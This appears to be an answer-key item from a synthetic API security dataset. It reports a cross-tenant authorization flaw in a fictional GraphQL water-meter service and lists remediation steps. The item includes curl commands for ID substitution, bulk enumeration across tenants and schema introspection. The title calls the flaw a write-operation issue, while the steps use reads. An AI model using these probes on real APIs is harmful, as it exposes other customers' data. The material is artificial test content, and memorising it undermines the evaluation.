# Expected Response

## System
- Domain: Water Utilities / Smart Meters
- System: AquaGrid Meter Management
- Example ID: GQL-0489

## Priority Findings

### Finding 1: GraphQL BOLA — Write operations without ownership check (Pattern 1.6)
**Severity:** Critical
**Category:** BOLA

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 1.6 (Write operations without ownership check) vulnerability.
An authenticated user belonging to `tenant-968a` can access or manipulate objects owned by
`tenant-9888` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-968a`
- Response body `tenantId`: `tenant-9888` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-9888`

**Root Cause:**
The resolver fetches the resource by `resourceId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-968A>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getResource(id: \"R-1489\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-968a"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-968A>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getResource(id: \"R-2489\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-9888"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-968A>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2489\", \"R-3489\", \"R-4489\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-968A>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
